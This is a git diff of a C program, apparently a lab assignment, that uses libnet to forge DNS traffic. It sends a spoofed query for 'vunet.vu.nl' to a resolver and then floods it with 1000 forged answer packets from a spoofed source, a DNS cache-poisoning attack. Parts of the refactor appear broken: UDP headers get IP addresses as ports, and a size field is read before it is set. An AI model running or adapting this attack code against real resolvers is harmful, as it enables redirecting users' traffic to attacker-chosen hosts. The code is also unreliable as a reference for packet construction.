@@ -15,42 +15,39 @@ struct Libnet 				makeLibnet();
 libnet_ptag_t 				makeIPHeader(struct IPv4HeaderOptions options);
 libnet_ptag_t 				makeUDPHeader(struct UDPHeaderOptions options);
 libnet_ptag_t 				makeDNSHeader(struct DNSHeaderOptions options);
-struct DNSRequestHeaders	makeDNSRequestHeaders(struct DNSRequestHeadersOptions options);
-struct DNSQueryRequest 		makeDNSQueryRequest(struct DNSRequestOptions options);
+struct RequestHeaderPtags	makeDNSRequestHeaders(struct DNSRequestHeadersOptions options);
+struct DNSQueryRequest 		makeDNSQueryRequest(struct UnformattedRequestOptions options);
 struct DNSQuestionRecord 	makeDNSQuestionRecord(struct DNSQuestionRecordOptions options);
 struct DNSAnswerRecord 		makeDNSAnswerRecord(struct DNSAnswerRecordOptions options);
-struct DNSAnswerRequest 	makeDNSAnswerRequest(struct DNSRequestOptions options);
+struct DNSAnswerRequest 	makeDNSAnswerRequest(struct UnformattedRequestOptions options);
 
 void partOne(int argc, char* argv[]) {
 
 }
 
-void baitAndPoison(struct DNSRequestOptions options) {
-	struct DNSQueryRequest QNameQuery = makeDNSQueryRequest(options);
-	options.sourceIP = "192.168.10.30";
-	options.base.destinationPort = 12000;
-	options.base.sourcePort = 53;
-	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(options);
+int main(int argc, char* argv[]) {
+
+	short part = parseOptions(argc, argv);
+	struct BaseRequestOptions baseRequestOptions;
+	baseRequestOptions.queryID = 1000;
+	baseRequestOptions.sourcePort = 17012;
+	baseRequestOptions.destinationPort = 53;
+	struct UnformattedRequestOptions bait;
+	bait.qname = "vunet.vu.nl";
+	bait.sourceIP = "192.168.10.20";
+	bait.destinationIP = "192.168.10.10";
+	bait.base = baseRequestOptions;
+	struct DNSQueryRequest QNameQuery = makeDNSQueryRequest(bait);
+
+	bait.sourceIP = "192.168.10.30";
+	bait.base.destinationPort = 12000;
+	bait.base.sourcePort = 53;
+	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(bait);
 	libnet_write(QNameQuery.base.libnet.context);
 	for(int i  = 0; i < 1000; i++){
 		libnet_write(answerRequest.queryRequest.base.libnet.context);
 	}
 	destroyLibnetContext(QNameQuery.base.libnet);
-}
-
-int main(int argc, char* argv[]) {
-
-	short part = parseOptions(argc, argv);
-	struct DNSBaseRequestOptions baseRequestOptions;
-	baseRequestOptions.queryID = 1000;
-	baseRequestOptions.sourcePort = 17012;
-	baseRequestOptions.destinationPort = 53;
-	struct DNSRequestOptions bait;
-	bait.qname = "vunet.vu.nl";
-	bait.sourceIP = "192.168.10.20";
-	bait.destinationIP = "192.168.10.10";
-	bait.base = baseRequestOptions;
-	baitAndPoison(bait);
 	return 0;
 }
 
@@ -131,16 +128,13 @@ libnet_ptag_t makeDNSHeader(struct DNSHeaderOptions options) {
 	return PTAG;
 }
 
-struct DNSRequestHeaders makeDNSRequestHeaders(struct DNSRequestHeadersOptions options) {
+struct RequestHeaderPtags makeDNSRequestHeaders(struct DNSRequestHeadersOptions options) {
 
-	struct DNSRequestHeaders headers;
-	struct UDPHeaderOptions UDPHeaderOptions = { options.libnet, options.recordsSize, options.base.sourcePort, options.base.destinationPort };
-	struct IPv4HeaderOptions IPOptions = { options.libnet, options.recordsSize, options.base.networkOrderedIPs.source, options.base.networkOrderedIPs.destination };
-
-	headers.DNSHeaderPtag = makeDNSHeader(options.dnsHeaderOptions);
-	headers.UDPHeaderPtag = makeUDPHeader(UDPHeaderOptions);
-	headers.IPv4HeaderPtag = makeIPHeader(IPOptions);
-
+	struct RequestHeaderPtags headerPtags;
+	headerPtags.DNSHeaderPtag = makeDNSHeader(options.dnsHeader);
+	headerPtags.UDPHeaderPtag = makeUDPHeader(options.udpHeader);
+	headerPtags.IPv4HeaderPtag = makeIPHeader(options.ipHeader);
+	return headerPtags;
 }
 
 
@@ -158,14 +152,12 @@ struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, ch
 	return ips;
 }
 
-struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){
+struct DNSAnswerRequest makeDNSAnswerRequest(struct UnformattedRequestOptions options){
 
 	struct DNSAnswerRequest answerRequest;
 	struct DNSQueryRequest queryRequest;
 	queryRequest.base.libnet = makeLibnet();
-	uint16_t qtype = 1, qclass = 1;
 	options.base.networkOrderedIPs = parseIPs(queryRequest.base.libnet, options.sourceIP, options.destinationIP);
-
 
 	struct DNSAnswerRecordOptions answerRecordOptions;
 	answerRecordOptions.qname = options.qname;
@@ -178,6 +170,7 @@ struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){
 	answerRecordOptions.libnet = queryRequest.base.libnet;
 	struct DNSAnswerRecord answerRecord = makeDNSAnswerRecord(answerRecordOptions);
 
+	uint16_t qtype = 1, qclass = 1;
 	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
 	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { queryRequest.base.libnet, DNSQuestionFormatOptions };
 	queryRequest.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);
@@ -188,7 +181,13 @@ struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){
 	requestHeadersOptions.libnet = queryRequest.base.libnet;
 	requestHeadersOptions.base = options.base;
 	requestHeadersOptions.recordsSize = queryRequest.DNSQuestionRecord.questionSize + answerRecord.recordSize;
-	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;
+
+	struct UDPHeaderOptions udpHeaderOptions = { queryRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.sourcePort, options.base.destinationPort };
+	struct IPv4HeaderOptions ipHeaderOptions = { queryRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.networkOrderedIPs.source, options.base.networkOrderedIPs.destination };
+
+	requestHeadersOptions.dnsHeader = dnsHeaderOptions;
+	requestHeadersOptions.udpHeader = udpHeaderOptions;
+	requestHeadersOptions.ipHeader = ipHeaderOptions;
 
 	queryRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
 	answerRequest.answerRecord = answerRecord;
@@ -196,28 +195,32 @@ struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){
 	return answerRequest;
 }
 
-struct DNSQueryRequest makeDNSQueryRequest(struct DNSRequestOptions options) {
+struct DNSQueryRequest makeDNSQueryRequest(struct UnformattedRequestOptions options) {
 
-	struct DNSQueryRequest query;
-	query.base.libnet = makeLibnet();
+	struct DNSQueryRequest queryRequest;
+	queryRequest.base.libnet = makeLibnet();
 	uint16_t qtype = 1, qclass = 1;
 
-	options.base.networkOrderedIPs = parseIPs(query.base.libnet, options.sourceIP, options.destinationIP);
+	options.base.networkOrderedIPs = parseIPs(queryRequest.base.libnet, options.sourceIP, options.destinationIP);
 
 	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
-	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { query.base.libnet, DNSQuestionFormatOptions };
-	query.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);
+	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { queryRequest.base.libnet, DNSQuestionFormatOptions };
+	queryRequest.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);
 
 	struct DNSRequestHeadersOptions requestHeadersOptions;
-	struct DNSHeaderOptions dnsHeaderOptions = { query.base.libnet, query.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};
+	struct DNSHeaderOptions dnsHeaderOptions = { queryRequest.base.libnet, queryRequest.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};
+	struct UDPHeaderOptions udpHeaderOptions = { queryRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.sourcePort, options.base.destinationPort };
+	struct IPv4HeaderOptions ipHeaderOptions = { queryRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.networkOrderedIPs.source, options.base.networkOrderedIPs.destination };
 
-	requestHeadersOptions.libnet = query.base.libnet;
+	requestHeadersOptions.libnet = queryRequest.base.libnet;
 	requestHeadersOptions.base = options.base;
-	requestHeadersOptions.recordsSize = query.DNSQuestionRecord.questionSize;
-	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;
+	requestHeadersOptions.recordsSize = queryRequest.DNSQuestionRecord.questionSize;
+	requestHeadersOptions.dnsHeader = dnsHeaderOptions;
+	requestHeadersOptions.udpHeader = udpHeaderOptions;
+	requestHeadersOptions.ipHeader = ipHeaderOptions;
 
-	query.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
-	return query;
+	queryRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
+	return queryRequest;
 }
 
 uint32_t makeByteNumberedIP(struct Libnet libnet, char* name, int resolve) {
@@ -264,9 +267,9 @@ libnet_ptag_t makeUDPHeader(struct UDPHeaderOptions options) {
 	uint16_t PTAG = 0;
 
 	libnet_ptag_t libnet_ptag = libnet_build_udp(
-		options.sourcePort,
-		options.destinationPort,
-		LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
+		options.base.networkOrderedIPs.source,
+		options.base.networkOrderedIPs.destination,
+		LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.recordsLength,
 		CHECKSUM,
 		NULL_PAYLOAD,
 		NULL_PAYLOAD_SIZE,
@@ -289,15 +292,15 @@ libnet_ptag_t makeIPHeader(struct IPv4HeaderOptions options) {
 	libnet_ptag_t PTAG = 0;
 
 	libnet_ptag_t libnet_ptag = libnet_build_ipv4(
-		LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
+		LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.recordsLength,
 		TYPE_OF_SERVICE,
 		ID,
 		FRAGMENTATION,
 		TTL,
 		PROTOCOL,
 		CHECKSUM,
-		options.sourceIP,
-		options.destinationIP,
+		options.base.networkOrderedIPs.source,
+		options.base.networkOrderedIPs.destination,
 		NULL_PAYLOAD,
 		NULL_PAYLOAD_SIZE,
 		options.libnet.context,
